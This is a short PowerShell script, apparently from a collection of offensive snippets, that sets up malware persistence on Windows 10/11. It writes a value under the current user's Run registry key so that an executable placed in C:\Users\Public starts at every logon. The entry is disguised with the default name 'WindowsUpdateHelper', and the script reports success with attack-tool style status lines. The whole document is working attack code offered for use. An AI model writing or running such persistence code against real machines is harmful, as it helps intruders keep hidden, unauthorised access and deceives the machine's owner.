# lang: PowerShell | file: persistence_run_key.ps1 | target: Windows 10/11
# tag: persistence | shell: powershell
# note: writes HKCU Run key — no elevation needed

param(
    [string]$Name    = "WindowsUpdateHelper",
    [string]$Payload = "C:\Users\Public\update.exe"
)

$reg_path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $reg_path -Name $Name -Value $Payload
Write-Output "[+] run key written: $Name -> $Payload"

$check = Get-ItemProperty -Path $reg_path -Name $Name -ErrorAction SilentlyContinue
if ($check) { Write-Output "[+] verified" } else { Write-Output "[-] write failed" }
